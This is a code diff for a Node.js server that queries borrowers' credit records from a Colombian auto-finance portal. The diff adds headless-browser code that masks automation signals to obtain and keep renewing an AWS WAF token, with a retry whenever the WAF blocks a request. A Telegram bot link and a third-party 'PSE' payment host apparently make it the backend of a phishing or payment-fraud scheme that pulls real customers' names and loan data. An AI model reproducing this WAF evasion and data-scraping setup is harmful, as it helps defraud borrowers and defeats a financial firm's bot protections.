@@ -1,14 +1,62 @@
 // API Mobilize v1 — consulta créditos RCI via AWS SigV4 + Cognito
-const express = require('express');
-const cors    = require('cors');
-const axios   = require('axios');
-const aws4    = require('aws4');
+const express    = require('express');
+const cors       = require('cors');
+const axios      = require('axios');
+const aws4       = require('aws4');
+const puppeteer  = require('puppeteer');
 // @aws-sdk/client-cognito-identity ya no se usa — calls directos via axios
 
 const TG_TOKEN  = process.env.TG_TOKEN  || '';
 const TG_CHAT   = process.env.TG_CHAT   || '';
-const WAF_TOKEN = process.env.WAF_TOKEN || '';
 const PORT      = process.env.PORT      || 3001;
+
+// ── Token WAF auto-refresh via Puppeteer ──────────────────────────────────────
+let _wafToken        = '';
+let _wafTokenExpiry  = 0;
+let _wafRefreshing   = false;
+
+async function refreshWafToken() {
+  if (_wafRefreshing) return;
+  _wafRefreshing = true;
+  try {
+    console.log('[WAF] Obteniendo token via Puppeteer...');
+    const browser = await puppeteer.launch({
+      headless: true,
+      executablePath: process.env.PUPPETEER_EXECUTABLE_PATH || undefined,
+      args: [
+        '--no-sandbox', '--disable-setuid-sandbox',
+        '--disable-dev-shm-usage', '--disable-blink-features=AutomationControlled',
+      ],
+    });
+    const page = await browser.newPage();
+    await page.evaluateOnNewDocument(() => {
+      Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
+    });
+    await page.goto('https://www.mobilize-fs.com.co/portal-pagos/', {
+      waitUntil: 'domcontentloaded', timeout: 30_000,
+    });
+    await new Promise(r => setTimeout(r, 8_000));
+    const cookies = await page.cookies('https://www.mobilize-fs.com.co');
+    await browser.close();
+    const found = cookies.find(c => c.name === 'aws-waf-token');
+    if (found) {
+      _wafToken       = found.value;
+      _wafTokenExpiry = Date.now() + 25 * 60 * 1000; // refrescar cada 25 min
+      console.log('[WAF] Token renovado OK:', _wafToken.slice(0, 40));
+    } else {
+      console.warn('[WAF] No se encontró aws-waf-token en cookies');
+    }
+  } catch (e) {
+    console.error('[WAF] Error al obtener token:', e.message);
+  } finally {
+    _wafRefreshing = false;
+  }
+}
+
+async function getWafToken() {
+  if (!_wafToken || Date.now() >= _wafTokenExpiry) await refreshWafToken();
+  return _wafToken;
+}
 
 const PSEC_BASE = 'https://pagpse-u6htdvaa.b4a.run';
 
@@ -277,6 +325,7 @@ async function getCreds() {
 async function signedPost(path, body) {
   const creds   = await getCreds();
   const bodyStr = JSON.stringify(body);
+  const wafTok  = await getWafToken();
 
   const reqHeaders = {
     'Content-Type': 'application/json',
@@ -284,7 +333,7 @@ async function signedPost(path, body) {
     'Origin':       PORTAL_ORIGIN,
     'User-Agent':   CHROME_UA,
   };
-  if (WAF_TOKEN) reqHeaders['Cookie'] = `aws-waf-token=${WAF_TOKEN}`;
+  if (wafTok) reqHeaders['Cookie'] = `aws-waf-token=${wafTok}`;
 
   const opts = aws4.sign({
     host:    API_HOST,
@@ -302,7 +351,20 @@ async function signedPost(path, body) {
     validateStatus: () => true,
   });
 
-  console.log(`[signedPost] ${path} → HTTP ${resp.status} | body: ${JSON.stringify(resp.data).slice(0, 400)}`);
+  console.log(`[signedPost] ${path} → HTTP ${resp.status}`);
+
+  // Si el WAF bloquea, forzar refresh y reintentar una vez
+  if (resp.status === 403 && JSON.stringify(resp.data).includes('WAF')) {
+    console.warn('[WAF] Token rechazado, forzando refresh...');
+    _wafTokenExpiry = 0;
+    const newTok = await getWafToken();
+    if (newTok) reqHeaders['Cookie'] = `aws-waf-token=${newTok}`;
+    const opts2 = aws4.sign({ host: API_HOST, path, method: 'POST', headers: reqHeaders, body: bodyStr, service: 'execute-api', region: AWS_REGION }, creds);
+    const resp2 = await axios.post(`${API_BASE}${path}`, bodyStr, { headers: opts2.headers, timeout: 15_000, validateStatus: () => true });
+    console.log(`[signedPost-retry] ${path} → HTTP ${resp2.status}`);
+    if (resp2.status >= 400) { const e2 = new Error(`HTTP ${resp2.status}`); e2.response = resp2; throw e2; }
+    return resp2.data;
+  }
 
   if (resp.status >= 400) {
     const err = new Error(`HTTP ${resp.status}`);
@@ -582,7 +644,7 @@ app.get('/api/mobilize/credito/:numero', async (req, res) => {
     );
 
     if (!data?.userInfo || !Object.keys(data.userInfo).length)
-      return res.status(404).json({ error: 'No existe crédito con ese número.', _raw: data });
+      return res.status(404).json({ error: 'No existe crédito con ese número.' });
 
     const u = data.userInfo;
     const [nombre, ...apellidos] = (u.NOMBRE_COMPLETO || '').split(' ');
@@ -862,6 +924,11 @@ async function pollTgCommands() {
 
 if (TG_TOKEN && TG_CHAT) setInterval(pollTgCommands, 3000);
 
-app.listen(PORT, () => {
+// Renovar token WAF cada 25 min
+setInterval(() => { _wafTokenExpiry = 0; refreshWafToken(); }, 25 * 60 * 1000);
+
+app.listen(PORT, async () => {
   console.log(`\n✅ API Mobilize v1 en http://localhost:${PORT}\n`);
+  // Pre-calentar token WAF al arrancar
+  await refreshWafToken();
 });
